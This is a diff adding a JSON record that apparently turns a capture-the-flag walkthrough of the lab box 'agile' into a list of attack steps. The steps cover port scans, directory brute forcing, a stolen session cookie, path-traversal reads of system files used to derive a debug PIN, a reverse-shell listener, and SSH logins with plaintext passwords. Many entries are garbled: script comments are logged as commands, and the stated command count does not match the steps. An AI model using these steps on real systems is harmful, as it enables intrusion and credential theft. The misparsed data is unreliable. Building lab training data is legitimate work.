@@ -1,0 +1,178 @@
+{
+  "target_ip": "10.10.11.203",
+  "os": "linux",
+  "steps": [
+    {
+      "phase": "recon",
+      "section": "nmap",
+      "command": "nmap -p- --min-rate 10000 10.10.11.203",
+      "action": "nmap_full",
+      "target_ip": "10.10.11.203"
+    },
+    {
+      "phase": "recon",
+      "section": "nmap",
+      "command": "nmap -p 22,80 -sCV 10.10.11.203",
+      "action": "nmap_scripts",
+      "target_ip": "10.10.11.203"
+    },
+    {
+      "phase": "foothold",
+      "section": "Directory Brute Force",
+      "command": "feroxbuster -u http://superpass.htb --dont-extract-links",
+      "action": "feroxbuster",
+      "target_ip": "10.10.11.203"
+    },
+    {
+      "phase": "recon",
+      "section": "Private Bits",
+      "command": "cookie=\"session=.eJwlzj0OwjAMQOG7ZGaIncQ_vUwVx7ZgbemEuDuV2N709H3Knkecz7K9jyseZX952cpMQegkZGndnMfEfqdWlYSIBPeqidw6rWU652CvyUiGzVFMqVWjlg6hstLMg5ciopvyjCHV2To1WUiTnIj53g_oQLEEpNyQ64zjr9Hy_QEv9zBO.ZMQS_Q.Z4LXfnoQS3utplGKkJ9ScRF8EMY\"",
+      "action": "unknown",
+      "target_ip": "10.10.11.203"
+    },
+    {
+      "phase": "recon",
+      "section": "Private Bits",
+      "command": "curl http://superpass.htb/download?fn=../../../../proc/net/arp -s --path-as-is -b $cookie",
+      "action": "curl_request",
+      "target_ip": "10.10.11.203"
+    },
+    {
+      "phase": "recon",
+      "section": "Private Bits",
+      "command": "curl http://superpass.htb/download?fn=../../../../sys/class/net/eth0/address -s --path-as-is -b $cookie",
+      "action": "curl_request",
+      "target_ip": "10.10.11.203"
+    },
+    {
+      "phase": "recon",
+      "section": "Private Bits",
+      "command": "curl http://superpass.htb/download?fn=../../../../etc/machine-id -s --path-as-is -b $cookie",
+      "action": "curl_request",
+      "target_ip": "10.10.11.203"
+    },
+    {
+      "phase": "recon",
+      "section": "Private Bits",
+      "command": "curl http://superpass.htb/download?fn=../../../../proc/self/cgroup -s --path-as-is -b $cookie",
+      "action": "curl_request",
+      "target_ip": "10.10.11.203"
+    },
+    {
+      "phase": "recon",
+      "section": "Hash Algorithm",
+      "command": "python agile.py",
+      "action": "unknown",
+      "target_ip": "10.10.11.203"
+    },
+    {
+      "phase": "recon",
+      "section": "Hash Algorithm",
+      "command": "python agile.py",
+      "action": "unknown",
+      "target_ip": "10.10.11.203"
+    },
+    {
+      "phase": "recon",
+      "section": "Shell",
+      "command": "nc -lvnp 443",
+      "action": "netcat",
+      "target_ip": "10.10.11.203"
+    },
+    {
+      "phase": "foothold",
+      "section": "Shell as corum",
+      "command": "sshpass -p '5db7caa1d13cc37c9fc2' ssh corum@superpass.htb",
+      "action": "ssh",
+      "target_ip": "10.10.11.203"
+    },
+    {
+      "phase": "recon",
+      "section": "Web Apps",
+      "command": "!/bin/bash",
+      "action": "unknown",
+      "target_ip": "10.10.11.203"
+    },
+    {
+      "phase": "recon",
+      "section": "Web Apps",
+      "command": "update prod with latest from testing constantly assuming tests are passing",
+      "action": "unknown",
+      "target_ip": "10.10.11.203"
+    },
+    {
+      "phase": "recon",
+      "section": "Web Apps",
+      "command": "if already running, exit",
+      "action": "unknown",
+      "target_ip": "10.10.11.203"
+    },
+    {
+      "phase": "recon",
+      "section": "Web Apps",
+      "command": "start in dev folder",
+      "action": "unknown",
+      "target_ip": "10.10.11.203"
+    },
+    {
+      "phase": "recon",
+      "section": "Web Apps",
+      "command": "system-wide source doesn't seem to happen in cron jobs",
+      "action": "unknown",
+      "target_ip": "10.10.11.203"
+    },
+    {
+      "phase": "recon",
+      "section": "Web Apps",
+      "command": "run tests, exit if failure",
+      "action": "unknown",
+      "target_ip": "10.10.11.203"
+    },
+    {
+      "phase": "recon",
+      "section": "Web Apps",
+      "command": "tests good, update prod (flask debug mode will load it instantly)",
+      "action": "unknown",
+      "target_ip": "10.10.11.203"
+    },
+    {
+      "phase": "recon",
+      "section": "Web Apps",
+      "command": "options.add_argument(\"--no-sandbox\")",
+      "action": "unknown",
+      "target_ip": "10.10.11.203"
+    },
+    {
+      "phase": "recon",
+      "section": "Chrome Debug",
+      "command": "sshpass -p 'd07867c6267dcb5df0af' ssh edwards@superpass.htb",
+      "action": "ssh",
+      "target_ip": "10.10.11.203"
+    },
+    {
+      "phase": "foothold",
+      "section": "venv",
+      "command": "all users will want the env associated with this application",
+      "action": "unknown",
+      "target_ip": "10.10.11.203"
+    },
+    {
+      "phase": "foothold",
+      "section": "venv",
+      "command": "system-wide source doesn't seem to happen in cron jobs",
+      "action": "unknown",
+      "target_ip": "10.10.11.203"
+    }
+  ],
+  "total_commands": 23,
+  "actions_used": [
+    "unknown",
+    "curl_request",
+    "ssh",
+    "netcat",
+    "nmap_scripts",
+    "feroxbuster",
+    "nmap_full"
+  ],
+  "box_name": "agile"
+}
